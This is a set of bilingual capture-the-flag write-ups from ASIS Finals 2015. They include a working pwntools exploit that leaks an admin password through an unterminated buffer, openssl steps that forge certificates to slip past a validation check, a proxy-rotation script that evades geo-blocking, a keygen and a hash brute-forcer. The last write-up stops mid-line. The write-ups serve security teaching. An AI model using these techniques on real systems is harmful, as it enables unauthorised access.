{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-10-asisfin/misc_75_flaghunter/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-10-asisfin/misc_75_flaghunter/README.md", "content": "﻿## FlagHunter 75 (re, 75p, 53 solves)\n\n### PL\n[ENG](#eng-version)\n\nWchodzimy pod podany w zadnaniu link i widzimy:\n\n![](map.png)\n\nMożemy kliknąć na kraj na mapie w wyniku czemu uzyskujemy jedną z dwóch odpowiedzi. \n\nJeśli klinęliśmy w kraj w którym jesteśmy (z którego mamy IP):\n\n![](code.png)\n\nJeśli klinięmy w inny kraj:\n\n![](error.png)\n\nPostanawiamy więc spróbować zebrać wszystkie możliwe kody, bo domyślamy się, że są potrzebne do uzyskania flagi. Robimy to za pomocą prostego skryptu:\n\n```python\nfrom Queue import Queue\nimport codecs\nimport os\nimport threading\nimport urllib\nimport urllib2\nimport re\nimport subprocess\n\nresults = {}\nurl = \"http://flaghunt.asis-ctf.ir/a.php\"\n\n\ndef test_proxy(proxy):\n    try:\n        proxy = proxy.strip()\n        proxy_host = proxy[:proxy.find(\":\")]\n        ping_response = os.system(\"ping -n 1 \" + proxy_host + \" > NUL\")\n        if ping_response == 0:\n            whois = subprocess.check_output(\"whois \" + proxy_host, stderr=subprocess.STDOUT)\n            pattern = re.compile(\"country:\\s*(.*)\\n\")\n            country_code = pattern.findall(whois.lower())[0].upper()\n            if country_code not in results:\n                params = {'code': country_code}\n                encoded_params = urllib.urlencode(params)\n                urllib2.install_opener(\n                    urllib2.build_opener(\n                        urllib2.ProxyHandler({'http': proxy})\n                    )\n                )\n                f = urllib2.urlopen(url, encoded_params)\n                response = f.read()\n                if \"long distance calls\" not in response:\n                    results[country_code] = response\n                    print(proxy + \" \" + country_code + \" \" + response)\n    except:\n        pass\n        # probably some problem with whois response\n\n\ndef worker():\n    while True:\n        proxy = q.get()\n        test_proxy(proxy)\n        q.task_done()\n        if q.unfinished_tasks % 100 == 0:\n            print(\"left to process \" + str(q.unfinished_tasks))\n\n\nwith codecs.open(\"proxy.txt\") as file:\n    q = Queue()\n    for i in range(30):\n        thread = threading.Thread(target=worker)\n        thread.daemon = True\n        thread.start()\n    for proxy in file.readlines():\n        q.put(proxy)\n    q.join()\n    print(results)\n```\n\n- kod uruchamia się w 30 wątkach\n- każdy pobiera z listy serwerów proxy (skomponowanej z google w kilka minut) jeden adres\n- pinguje go żeby upewnić się, że działa\n- pobiera z whois informacje o kraju dla tego proxy\n- jeśli nie mamy jeszcze na liście kodu dla tego kraju to wysyłamy zapytanie symulujące klikniecie w ten kraj na mapie, poprzez wybrane proxy\n- odebrany kod zapisujemy\n\nOkazuje się, że unikalnych kodów jest tylko kilka. Wszystkie unikalne kody to:\n\n`f55101, 353c45, fc, c99801, bf853b, 926c51`\n\nJak nie trudno zauważyć mamy tutaj dokładnie 32 znaki z zakresu [0-9a-f], czyli rozłożony na kawałki hash md5. To sugerowałoby, że można z nich skleić flagę. Ale nie mieliśmy pomysłu na to, w jakiej kolejności to zrobić. Jeden z naszych kolegów postanowił zdać sie na intuicje i po prostu wysłał losowo sklejoną flagę. Niemniej późniejsza analiza wykazała, że tylko jedna ze 120 możliwości była poprawna (możliwa do wyliczenia poprzez analizę kodu JS który na stronie walidował flagę). Nasz kolega powinien kupić los na loterii.\n\n`ASIS{926c51bf853b353c45f55101c99801fc}`\n\n### ENG version\n\nWe go to the designated webpage to find:\n\n![](map.png)\n\nWe can click on a country on the map and we can get one of two answers:\n\nIf we clicked on a country where we are (where out IP is from):\n\n![](code.png)\n\nIf we click any other country:\n\n![](error.png)\n\nSo we start off by trying to collect all the codes, since we suspect that we will need those for the flag. We do this with a simple script:\n\n```python\nfrom Queue import Queue\nimport codecs\nimport os\nimport threading\nimport urllib\nimport urllib2\nimport re\nimport subprocess\n\nresults = {}\nurl = \"http://flaghunt.asis-ctf.ir/a.php\"\n\n\ndef test_proxy(proxy):\n    try:\n        proxy = proxy.strip()\n        proxy_host = proxy[:proxy.find(\":\")]\n        ping_response = os.system(\"ping -n 1 \" + proxy_host + \" > NUL\")\n        if ping_response == 0:\n            whois = subprocess.check_output(\"whois \" + proxy_host, stderr=subprocess.STDOUT)\n            pattern = re.compile(\"country:\\s*(.*)\\n\")\n            country_code = pattern.findall(whois.lower())[0].upper()\n            if country_code not in results:\n                params = {'code': country_code}\n                encoded_params = urllib.urlencode(params)\n                urllib2.install_opener(\n                    urllib2.build_opener(\n                        urllib2.ProxyHandler({'http': proxy})\n                    )\n                )\n                f = urllib2.urlopen(url, encoded_params)\n                response = f.read()\n                if \"long distance calls\" not in response:\n                    results[country_code] = response\n                    print(proxy + \" \" + country_code + \" \" + response)\n    except:\n        pass\n        # probably some problem with whois response\n\n\ndef worker():\n    while True:\n        proxy = q.get()\n        test_proxy(proxy)\n        q.task_done()\n        if q.unfinished_tasks % 100 == 0:\n            print(\"left to process \" + str(q.unfinished_tasks))\n\n\nwith codecs.open(\"proxy.txt\") as file:\n    q = Queue()\n    for i in range(30):\n        thread = threading.Thread(target=worker)\n        thread.daemon = True\n        thread.start()\n    for proxy in file.readlines():\n        q.put(proxy)\n    q.join()\n    print(results)\n```\n\n- the code is running in 30 threads\n- each one takes an address from proxy servers list (compiled from google in a couple of minutes)\n- pings the proxy to make sure it's online\n- collects country code from whois info for the proxy\n- if we don't have the code for the country we send a request simulating clicking on this country on the map, through the selected proxy\n- we save the response code\n\nIt turns out that there are only a few unique codes. All of them are:\n\n`f55101, 353c45, fc, c99801, bf853b, 926c51`\n\nAs can be easily noticed we have exactly 32 characters from [0-9a-f] range, so a split md5 hash value. This suggest that maybe we could assemble a flag from this. But we had no idea what should be the order. One of our friends, lead by intuition, simply tried to send a random permutation as a flag. Interestingly we later realised that in fact only one of potential 120 flags was correct (the right one could be found by analysing JS code on flag validation site). Our friend should start playing some lottery.\n\n`ASIS{926c51bf853b353c45f55101c99801fc}`", "timestamp": "2025-10-21T22:03:12.295097"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-10-asisfin/misc_75_meowmeow/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-10-asisfin/misc_75_meowmeow/README.md", "content": "## MeowMeow 75 (misc, 75p)\n\n![alt text](screenshot.png)\n\n### PL\n[ENG](#eng-version)\n\nDostajemy [dziwny plik tekstowy](meowmeow) z różnymi wyrażeniami typu `((_____ << __) + _)`\n\nJeśli ktoś robił cokolwiek w C to pewnie rozpozna syntax tego języka.\n\n`A << B` odpowiada przesunięciu `A` o `B` bitów w lewo, a `A + B` i `(...)` chyba nie muszę tłumaczyć :)\n\nTak więc za dane podkreślenie podstawiamy jego długość i [wszystko uruchamiamy](solve.py). Dostajaemy długą liczbę `0xa7d30363063346262616338356133653036663535303863343836616531653138397b53495341L`, zamieniamy ją na text i dostajemy `}060c4bbac85a3e06f5508c486ae1e189{SISA`\n\n### ENG version\n\nIn this task, we're presented with a [weird-looking text file](meowmeow) with various expressions like `((_____ << __) + _)`\n\nIf you've done almost anything in C then you should notice that this is a valid C code.\n\n`A << B` corresponds to left bitwise shift, I don't think I have to explain how `A + B` and `(...)` work :)\n\nSo we swap each underline with it's length and try to run [the code](solve.py). We get this quite long hex number:`0xa7d30363063346262616338356133653036663535303863343836616531653138397b53495341L`, covert it to text and you get a reversed flag `}060c4bbac85a3e06f5508c486ae1e189{SISA`\n", "timestamp": "2025-10-21T22:03:12.568540"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-10-asisfin/pwn_100_shop_1/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-10-asisfin/pwn_100_shop_1/README.md", "content": "﻿## Shop-1 (pwn, 100p, 34 solves)\n\n> Our marvelous Bragisdumus shop just opened. Come and see [our beautiful Bragisdumus](bragisdumu-shop)!  \n> Login as an admin! get the admin password.  \n> nc 185.106.120.220 1337\n\n### PL\n[ENG](#eng-version)\n\nZ zadaniem otrzymujemy binarkę serwera usługi typu CRUD z wpisami w pamięci procesu. Zgodnie z opisem celem pierwszej części jest zdobycie hasła administratora. Możemy również zalogować się na gościa z loginem i hasłem \"guest\".\n\nW głównej funkcji programu widzimy, że hasło administratora od momentu wczytania go z pliku \"żyje\" bardzo krótko:\n\n```c\npassword = sub_FB5(\"adminpass.txt\", &length);\nresult = memcmp(input_password, password, length);\nfree(password);\n```\n\nSama funkcja wczytująca hasło z pliku wydaje się w porządku. W takim razie sprawdźmy co z wynikiem `memcmp`, a konkretnie gdzie na stosie znajduje się zmienna `result`.\n\n```c\nchar input_login[32]; // [bp-70h]\nchar input_password[64]; // [bp-50h]\nint result; // [bp-10h]\n```\n\nWidzimy zatem, że zaraz za buforami na wprowadzony login i hasło.\n\n```c\nprintf(\"Logged in as %s\\n\\n\", input_login);\n```\n\nWprowadzony login jest również wypisywany. Może nam to sugerować, że chodzić może o wyciek `result`. Zwłaszcza, że w funkcji wczytującej tekst nie widzimy wstawienia null-byte'a na koniec. Musimy więc wysłać przynajmniej 32 znaki w loginie i 64 w haśle.\n\nWynik `memcmp` w naszym przypadku to dokładna różnica pomiędzy pierwszymi różniącymi się bajtami. Możemy zatem znak po znaku wyciągnąć hasło.\n\n```python\nimport pwnlib\n#host = 'localhost'\nhost = '185.106.120.220'\n\nclient = pwnlib.tubes.remote.remote(host, 1337)\n\ndef login(username, password):\n\tclient.recvuntil('Username: ')\n\tclient.sendline(username)\n\tclient.recvuntil('Password: ')\n\tclient.sendline(password)\n\npassword = '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'\n\nfor i in range(38):\n\tlogin('adminxxxxxxxxxxxxxxxxxxxxxxxxxxxxx', password)\n\tlogin('guest', 'guest')\n\tn = int(client.recvlines(2)[1][109:].encode('hex'), 16)\n\tpassword = password[:i] + chr(ord(password[i]) - n) + password[i + 1:]\n\tclient.sendline('8')\n\tprint password\n```\n\nHasło oraz flaga to `ASIS{304b0f16eb430391c6c86ab0f3294211}`.\n\n\n### ENG version\n\nWith the task we get a binary of a CRUD service in some entries inside process memory. According to task description the goal is to get the admin password. We can also login to a gues account with user/pass \"gest\".\n\nIn the main function of the program we can see that the admin password \"lives very short\" after it is read from the file:\n\n```c\npassword = sub_FB5(\"adminpass.txt\", &length);\nresult = memcmp(input_password, password, length);\nfree(password);\n```\n\nThe password reading function itself seems to be fine at the first glance. Therefore we check what happens with `memcmp` result, specifically: where on the stack is the `result` variable.\n\n```c\nchar input_login[32]; // [bp-70h]\nchar input_password[64]; // [bp-50h]\nint result; // [bp-10h]\n```\n\nWe can see that right after the login and passwrod buffers.\n\n```c\nprintf(\"Logged in as %s\\n\\n\", input_login);\n```\n\nThe login is also printed out. This can be a suggestion that it's about leaking `result`. Especially that in the function reading the text there is no null-byte termination inserted. So we need to sent at least 32 characters in login and 64 in password.\n\nThe result of `memcmp` in our case is the exact difference between first differing bytes. Therefore we can extract the password character by character:\n\n```python\nimport pwnlib\n#host = 'localhost'\nhost = '185.106.120.220'\n\nclient = pwnlib.tubes.remote.remote(host, 1337)\n\ndef login(username, password):\n\tclient.recvuntil('Username: ')\n\tclient.sendline(username)\n\tclient.recvuntil('Password: ')\n\tclient.sendline(password)\n\npassword = '~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'\n\nfor i in range(38):\n\tlogin('adminxxxxxxxxxxxxxxxxxxxxxxxxxxxxx', password)\n\tlogin('guest', 'guest')\n\tn = int(client.recvlines(2)[1][109:].encode('hex'), 16)\n\tpassword = password[:i] + chr(ord(password[i]) - n) + password[i + 1:]\n\tclient.sendline('8')\n\tprint password\n```\n\nPassword and the flag: `ASIS{304b0f16eb430391c6c86ab0f3294211}`.\n", "timestamp": "2025-10-21T22:03:12.886734"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-10-asisfin/pwn_200_calcexec_I/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-10-asisfin/pwn_200_calcexec_I/README.md", "content": "﻿## calcexec I (pwn, 200p, 7 solves)\n\n> 2+2 == [5](Calc.exe)?  \n> nc 185.82.202.146 1337\n\n### PL\n[ENG](#eng-version)\n\nZadanie to usługa ewaluatora wyrażeń matematycznych napisana w C#. Widzimy, że jedną z funkcji ewalutora jest wypisanie nam flagi.\n\n```csharp\ncalcEngine.RegisterFunction(\"FLAG\", 0, (p => File.ReadAllText(\"flag1\")));\n```\n\nNiestety, konstruktor ewalutora przyjmuje listę dozwolonych funkcji i domyślnie jest ona pusta. Możemy natomiast je podać w certyfikacie x509 w jego dodatkowym rozszerzeniu.\n\n```csharp\nX509Extension x509Extension = cert.Extensions[\"1.1.1337.7331\"];\nif (x509Extension != null)\n\tcalcEngine = Program.InitCalcEngine(Enumerable.ToArray(\n\t\tEnumerable.Select(Encoding.Default.GetString(\n\t\t\tx509Extension.RawData).Split(','), (x => x.Trim()))));\n```\n\nNiestety nie możemy wysłać jednak dowolnego certyfikatu. Są one w kilku krokach weryfikowane.\n\nNie możemy podać certyfikatu o subjekcie już wczytanego:\n\n```csharp\nstring key = new X509Name(x509Certificate2.Subject).ToString();\nif (this.Items.ContainsKey(key))\n\tthrow new Exception(\"Certificate is already loaded!\");\n```\n\nSubject certyfikatu musi zawierać podany identifier:\n```csharp\nreturn Enumerable.SingleOrDefault(Enumerable.OfType<string>(\n\tnew X509Name(cert.Subject).GetValues(\n\t\tnew DerObjectIdentifier(\"2.5.4.1337\")))) == \"calc.exe\";\n```\n\nIssuer certyfikatu nie może być nim sam:\n```csharp\nstring name1 = new X509Name(certificateName).ToString();\nX509Certificate2 certificateByName = this.Store.FindCertificateByName(name1);\nstring name2 = new X509Name(certificateByName.Issuer).ToString();\nif (name2 == name1)\n\treturn false;\n```\n\nOraz ostatecznie jest sprawdzana jego sygnatura kluczem publicznym wczytanego wcześniej issuera.\n```csharp\nAsn1Sequence asn1Sequence = new Asn1InputStream(this.Store.FindCertificateByName(name2)\n\t.GetPublicKey()).ReadObject();\nDotNetUtilities.FromX509Certificate(certificateByName).Verify(\n\tnew RsaKeyParameters(false, ((DerInteger) asn1Sequence[0]).Value,\n\t\t((DerInteger) asn1Sequence[1]).Value));\n```\n\nJeżeli któryś z checków nie powiedzie się, wczytany certyfikat jest usuwany ze store'a.\n\nŻeby móc wczytać własny certyfikat musimy znaleźć lukę w którymś z powyższych kodów. Dwa ostatnie zamknięte były w bloku try-catch, ale jeżeli udałoby się wywołać wyjątek w jednym z pozostałych to certyfikat nie zostałby usunięty.\n\nOkazuje się, że certyfikaty x509 mogą posiadać wiele identyfikatorów z tą samą nazwą. Jeżeli więc spreparujemy certyfikat z więcej niż jednym identyfikatorem \"2.5.4.1337\" spowoduje to wyjątek przy wywołaniu `SingleOrDefault()`, które oczekuje co najwyżej jednego elementu.\n\nGdyby w ten sposób udało się wczytać certyfikat to będziemy mogli stworzyć certyfikat, który przejdzie wszystkie te checki.\n\n```\nopenssl req -new -nodes -keyout CA.key -subj \"/CN=MyCalc/O=MyCalc/OU=MyCalc/calc=MyCalc/calc=MyCalc\" > CA.csr\nopenssl x509 -sha1 -req -signkey CA.key < CA.csr > CA.crt\nopenssl req -new -nodes -keyout client.key -config config -extensions cert_extensions > client.csr\nopenssl x509 -extfile config -extensions cert_extensions -sha1 -req -CAkey CA.key -CA CA.crt < client.csr > client.crt \n```\n\nOraz plik konfiguracyjny dla openssl:\n\n```\noid_section\t= new_oids \n[ new_oids ] \nfooname = 2.5.4.1337\n\n[ req ] \ndefault_bits       = 2048 \ndistinguished_name = req_distinguished_name \nattributes         = req_attributes \nprompt             = no \nx509_extensions    = cert_extensions\n\n[ req_distinguished_name ] \nfooname = calc.exe\nCN = calc.exe\nO = calc.exe\nemailAddress = calc@asis-ctf.ir\nL = Iran\nC = IR\n\n[ req_attributes ] \n\n[ cert_extensions ] \n1.1.1337.7331 = ASN1:UTF8:ABS,ACOS,ASIN,ATAN,ATAN2,CEILING,COS,COSH,EXP,FLOOR,INT,LN,LOG,LOG10,PI,POWER,RAND,RANDBETWEEN,SIGN,SIN,SINH,SQRT,SUM,SUMIF,TAN,TANH,TRUNC,AVERAGE,AVERAGEA,COUNT,COUNTA,COUNTBLANK,COUNTIF,MAX,MAXA,MIN,MINA,STDEV,STDEVA,STDEVP,STDEVPA,VAR,VARA,VARP,VARPA,CHAR,CODE,CONCATENATE,FIND,LEFT,LEN,LOWER,MID,PROPER,READ,REPLACE,REPT,RIGHT,SEARCH,SUBSTITUTE,T,TEXT,TRIM,UPPER,VALUE,WRITE,FLAG\n```\n\nW ten sposób przygotowane certyfikaty udaje się wczytać do programu oraz wywołać funkcję FLAG.\n\n`ASIS{e5cb5e25f77c1da6626fb78a48a678f3}`\n\n### ENG version\n\nThe task is a mathematical expressions evaluator service written in C#. We can see that one of the functions is printing the flag.\n\n```csharp\ncalcEngine.RegisterFunction(\"FLAG\", 0, (p => File.ReadAllText(\"flag1\")));\n```\n\nUnfortunately, the evaluator constructor takes a list of allowed functions and by default it's empty. We can, however, add those in x509 certificates in the added extension.\n\n```csharp\nX509Extension x509Extension = cert.Extensions[\"1.1.1337.7331\"];\nif (x509Extension != null)\n\tcalcEngine = Program.InitCalcEngine(Enumerable.ToArray(\n\t\tEnumerable.Select(Encoding.Default.GetString(\n\t\t\tx509Extension.RawData).Split(','), (x => x.Trim()))));\n```\n\nHowever, we can't just send any certificate. They are verified in multiple steps.\n\nWe can't send a certificate with already loaded subject:\n\n```csharp\nstring key = new X509Name(x509Certificate2.Subject).ToString();\nif (this.Items.ContainsKey(key))\n\tthrow new Exception(\"Certificate is already loaded!\");\n```\n\nSubject of the certificate has to contain given identifier:\n```csharp\nreturn Enumerable.SingleOrDefault(Enumerable.OfType<string>(\n\tnew X509Name(cert.Subject).GetValues(\n\t\tnew DerObjectIdentifier(\"2.5.4.1337\")))) == \"calc.exe\";\n```\n\nCertificate issuer can't be himself:\n```csharp\nstring name1 = new X509Name(certificateName).ToString();\nX509Certificate2 certificateByName = this.Store.FindCertificateByName(name1);\nstring name2 = new X509Name(certificateByName.Issuer).ToString();\nif (name2 == name1)\n\treturn false;\n```\n\nAnd finally it is checked with public key of the issuer read previously.\n```csharp\nAsn1Sequence asn1Sequence = new Asn1InputStream(this.Store.FindCertificateByName(name2)\n\t.GetPublicKey()).ReadObject();\nDotNetUtilities.FromX509Certificate(certificateByName).Verify(\n\tnew RsaKeyParameters(false, ((DerInteger) asn1Sequence[0]).Value,\n\t\t((DerInteger) asn1Sequence[1]).Value));\n```\n\nIf any of the checks fails the certificate is removed from the store.\n\nIn order to be able to load our own certificate we need to find a loophole in one of the codes above. The last two are in try-catch block, but if we could raise an exception in one of the remaining ones then the certificate would not get removed.\n\nIt turns out that x509 certificates can have multiple identifiers with the same name. Therefore if we prepare a certificate with more than one identifier \"2.5.4.1337\" it will cause an exception during `SingleOrDefault()` call, which expects at most one element.\n\nIf we could load a certificate this way, we could create a certificate which will pass all the checks.\n\n```\nopenssl req -new -nodes -keyout CA.key -subj \"/CN=MyCalc/O=MyCalc/OU=MyCalc/calc=MyCalc/calc=MyCalc\" > CA.csr\nopenssl x509 -sha1 -req -signkey CA.key < CA.csr > CA.crt\nopenssl req -new -nodes -keyout client.key -config config -extensions cert_extensions > client.csr\nopenssl x509 -extfile config -extensions cert_extensions -sha1 -req -CAkey CA.key -CA CA.crt < client.csr > client.crt \n```\n\nAnd the openssl config file:\n\n```\noid_section\t= new_oids \n[ new_oids ] \nfooname = 2.5.4.1337\n\n[ req ] \ndefault_bits       = 2048 \ndistinguished_name = req_distinguished_name \nattributes         = req_attributes \nprompt             = no \nx509_extensions    = cert_extensions\n\n[ req_distinguished_name ] \nfooname = calc.exe\nCN = calc.exe\nO = calc.exe\nemailAddress = calc@asis-ctf.ir\nL = Iran\nC = IR\n\n[ req_attributes ] \n\n[ cert_extensions ] \n1.1.1337.7331 = ASN1:UTF8:ABS,ACOS,ASIN,ATAN,ATAN2,CEILING,COS,COSH,EXP,FLOOR,INT,LN,LOG,LOG10,PI,POWER,RAND,RANDBETWEEN,SIGN,SIN,SINH,SQRT,SUM,SUMIF,TAN,TANH,TRUNC,AVERAGE,AVERAGEA,COUNT,COUNTA,COUNTBLANK,COUNTIF,MAX,MAXA,MIN,MINA,STDEV,STDEVA,STDEVP,STDEVPA,VAR,VARA,VARP,VARPA,CHAR,CODE,CONCATENATE,FIND,LEFT,LEN,LOWER,MID,PROPER,READ,REPLACE,REPT,RIGHT,SEARCH,SUBSTITUTE,T,TEXT,TRIM,UPPER,VALUE,WRITE,FLAG\n```\n\nWe succeed in loading certificates prepared this way and call the FLAG function: `ASIS{e5cb5e25f77c1da6626fb78a48a678f3}`\n", "timestamp": "2025-10-21T22:03:13.141873"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-10-asisfin/re_100_license/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-10-asisfin/re_100_license/README.md", "content": "﻿## License 100 (re, 100p)\n\n### PL\n[ENG](#eng-version)\n\nDostajemy [program](./license) (elf), do analizy, i rozpoczynamy czytanie kodu.\n\nProgram otwiera plik (domyślamy sie że z tytułową licencją), wykonuje serię operacji/sprawdzeń, i jeśli coś mu się nie podoba na którymś kroku, wypisuje błąd i skończy działanie.\n\n    .text:00000000004009C7                 mov     edi, offset a_aBC_ ; \"_a\\nb\\tc_\"\n    ...\n    .text:00000000004009EE                 call    _fopen\n\nJak widać, nazwa pliku jest dość nietypowa. Nie jest to nic czego linux nie osiągnie, ale praca z plikiem o takiej nazwie jest dość nieprzyjemna. Z tego powodu plik nazwaliśmy \"kot\" i spatchowaliśmy binarkę z programem (tak że otwierał plik o nazwie \"kot\").\n\nPierwszy check - jeśli otworzenie pliku albo czytanie z niego się nie powiedzie, program kończy działanie.\n\nDrugi check - wykonywana jest skomplikowana operacja na długości pliku, która po chwili reversowania sprowadza się do:\n\n    if (-45235*x*x*x*x + -1256*x*x*x + 14392*x*x + -59762*x - 1949670109068 + 44242*x*x*x*x*x == 0) {\n        // ok\n    } else {\n        // koniec programu\n    } \n\nGdzie x to ilość bajtów w pliku licencji. \nW celu rozwiązania tego równania pytamy naszego niezastąpionego pomocnika, WolframAlpha. Rozwiązaniem jest x = 34.\n\nNastępnie następuje długa pętla dzieląca plik wejściowy na linie i zliczająca znaki nowej linii, a później:\n\n    if (linesInFile == 5) {\n        // ok\n    } else {\n        // koniec programu\n    }\n\nJako że wszystkie linie mają taką samą długość (co można zaobserwować w kodzie), Można z tego łatwo wyliczyć że każda linia musi mieć 6 znaków (6 * 5 znaków w linii + 4 znaki '\\n')\n\nNastępnie następuje długie sprawdzenie, w pythonie wyglądałoby na przykład tak (word1, word2... to odpowiednio pierwsza, druga... linia z pliku)\n\n    result = 'iKWoZLVc4LTyGrCRedPhfEnihgyGxWrCGjvi37pnPGh2f1DJKEcQZMDlVvZpEHHzUfd4VvlMzRDINqBk;1srRfRvvUW' # stała zaszyta w programie\n    w23 = '\\x23\\x23\\x23\\x23\\x23\\x23'\n    level1 = result[0:n]\n    level2 = result[n:2*n]\n    level3 = result[2*n:3*n]\n    level5 = result[3*n:4*n]\n    level4 = xor(word3, level5)\n\n    assert level1 == xor(word1, word2)\n    assert level2 == xor(xor(word2, word4), w23)\n    assert level3 == xor(word3, word4)\n    assert level4 == xor(xor(word5, word4), w23)\n    assert level5 == xor(level4, word3)\n\nWszystkie operacje tutaj są odwracalne, więc po chwili mamy kod tworzący poprawny plik z licencją:\n\n    level1 = result[0:n]\n    level2 = result[n:2*n]\n    level3 = result[2*n:3*n]\n    level5 = result[3*n:4*n]\n\n    w23 = '\\x23\\x23\\x23\\x23\\x23\\x23'\n    word4 = result[4*n:5*n]\n    word3 = xor(word4, level3)\n    word2 = xor(xor(word4, w23), level2)\n    word1 = xor(word2, level1)\n    level4 = xor(word3, level5)\n    word5 = xor(xor(word4, w23), level4)\n\n    # check\n    level1c = xor(word1, word2)\n    level2c = xor(xor(word2, word4), w23)\n    level3c = xor(word3, word4)\n    level4c = xor(xor(word5, word4), w23)\n    level5c = xor(level4c, word3)\n\n    assert level1.encode('hex') == level1c.encode('hex')\n    assert level2.encode('hex') == level2c.encode('hex')\n    assert level3.encode('hex') == level3c.encode('hex')\n    assert level4.encode('hex') == level4c.encode('hex')\n    assert level5.encode('hex') == level5c.encode('hex')\n\n    open('kot', 'wb').write('\\n'.join([word1, word2, word3, word4, word5]))\n\nUruchamiamy więc program z odpowiednią [licencją](kot), i...\n\n    vagrant@precise64:~$ ./license\n    program successfully registered to ASIS{8d2cc30143831881f94cb05dcf0b83e0}\n\ngotowe.\n\n### ENG version\n\nWe get a [program](./license) (elf) for analysis and we start to read the code.\n\nIt opens a file (we expect this to be the \"licence\" from task title), executs a series of operations/checks and if something is wrong at one step it prints an error and exits.\n\n    .text:00000000004009C7                 mov     edi, offset a_aBC_ ; \"_a\\nb\\tc_\"\n    ...\n    .text:00000000004009EE                 call    _fopen\n\nAs we can see the filename is not ordinary. While we could get this done on linux, we consider working with such file to be unpleasant. Therefore we named the file `kot` and we patched the binary (so it opens a file `kot`).\n\nFirst check - if opening the file or reading it fails, the program exits.\n\nSecond check - a complex operation is performed on the file length, which after a while of reverse engineering turned out to be:\n\n    if (-45235*x*x*x*x + -1256*x*x*x + 14392*x*x + -59762*x - 1949670109068 + 44242*x*x*x*x*x == 0) {\n        // ok\n    } else {\n        // exit\n    } \n\nWhere x is number of bytes in the licence file.\nIn order to solve this equation we use WolframAlpha and we get x = 34.\n\nNext there is a long loop which splits the input file into lines and counts newline characters and then:\n\n    if (linesInFile == 5) {\n        // ok\n    } else {\n        // exit\n    }\n\nEvery line has the same length (which can be observed in the code), we can deduce that every line needs 6 characters (6*5 characters in line + 4 newline characters = 34 bytes in file).\n\nNext there is a long check which in python would look like (word1, word2... is first, second.... line from file)\n\n    result = 'iKWoZLVc4LTyGrCRedPhfEnihgyGxWrCGjvi37pnPGh2f1DJKEcQZMDlVvZpEHHzUfd4VvlMzRDINqBk;1srRfRvvUW' # stała zaszyta w programie\n    w23 = '\\x23\\x23\\x23\\x23\\x23\\x23'\n    level1 = result[0:n]\n    level2 = result[n:2*n]\n    level3 = result[2*n:3*n]\n    level5 = result[3*n:4*n]\n    level4 = xor(word3, level5)\n\n    assert level1 == xor(word1, word2)\n    assert level2 == xor(xor(word2, word4), w23)\n    assert level3 == xor(word3, word4)\n    assert level4 == xor(xor(word5, word4), w23)\n    assert level5 == xor(level4, word3)\n\nAll operations are reversible so after a while we have code to generate correct licence file:\n\n    level1 = result[0:n]\n    level2 = result[n:2*n]\n    level3 = result[2*n:3*n]\n    level5 = result[3*n:4*n]\n\n    w23 = '\\x23\\x23\\x23\\x23\\x23\\x23'\n    word4 = result[4*n:5*n]\n    word3 = xor(word4, level3)\n    word2 = xor(xor(word4, w23), level2)\n    word1 = xor(word2, level1)\n    level4 = xor(word3, level5)\n    word5 = xor(xor(word4, w23), level4)\n\n    # check\n    level1c = xor(word1, word2)\n    level2c = xor(xor(word2, word4), w23)\n    level3c = xor(word3, word4)\n    level4c = xor(xor(word5, word4), w23)\n    level5c = xor(level4c, word3)\n\n    assert level1.encode('hex') == level1c.encode('hex')\n    assert level2.encode('hex') == level2c.encode('hex')\n    assert level3.encode('hex') == level3c.encode('hex')\n    assert level4.encode('hex') == level4c.encode('hex')\n    assert level5.encode('hex') == level5c.encode('hex')\n\n    open('kot', 'wb').write('\\n'.join([word1, word2, word3, word4, word5]))\n\nWe run the binary with correct [licence](kot), and...\n\n    vagrant@precise64:~$ ./license\n    program successfully registered to ASIS{8d2cc30143831881f94cb05dcf0b83e0}\n\nDone.", "timestamp": "2025-10-21T22:03:13.421995"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-10-10-asisfin/re_150_asishash/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-10-10-asisfin/re_150_asishash/README.md", "content": "﻿## AsisHash 150 (re, 150p)\n\n### PL\n[ENG](#eng-version)\n\nDostajemy [program](./hash.elf) (elf). Analizujemy jego działanie, w dużym uproszczeniu wygląda to tak:\n\n    int main() {\n        char password[...];\n        scanf(\"%s\", password);\n\n        char *hash = hash_password(password);\n        if (!strcmp(hash, good_hash)) {\n            puts(\"Congratz, you got the flag :) \");\n        } else {\n            puts(\"Sorry! flag is not correct!\");\n        }\n    }\n\nFunkcja hash_password jest bardzo skomplikowana i nawet nie próbowaliśmy analizować jej działania. Zamiast tego zrobiliśmy coś prostszego - ponieważ\nhash jest monotoniczny (dla dłuższych haseł/wyższych znaków ascii daje wyższe wyniki), spróbowaliśmy zgadnac hash (docelowy hash flagi jest stay i równy 27221558106229772521592198788202006619458470800161007384471764) za pomocą bruteforcowania z nawrotami wszystkich możliwych flag:\n\n    import subprocess\n\n    def run(flag):\n        return subprocess.check_output(['./hash.elf', flag]).split('\\n')[0]\n\n    def prefx(a, b):\n        p = 0\n        for ac, bc in zip(a, b):\n            if ac == bc:\n                p += 1\n            else:\n                break\n        return p\n\n    def plaintext(t):\n        return ''.join(c if 32 <= ord(c) <= 127 else '.' for c in t)\n\n    sln = '27221558106229772521592198788202006619458470800161007384471764'\n    charset = '0123456789abcdef}'\n\n    def tryit(f, r, n):\n        pp = prefx(sln, r)\n        print plaintext(f), r[:pp], r[pp:]\n        stat = '<' if sln[pp] < r[pp] else '>'\n        print plaintext(f), r[:pp], r[pp:], stat\n        for c in charset:\n            f2 = f[:n] + c + f[n+1:]\n            r2 = run(f2)\n            p2 = prefx(sln, r2)\n            if p2 > pp:\n                s = tryit(f2, r2, n+1)\n                if s == '>':\n                    return\n        return stat\n\n    for c in range(256): # try to guess good initial padding\n        print c, 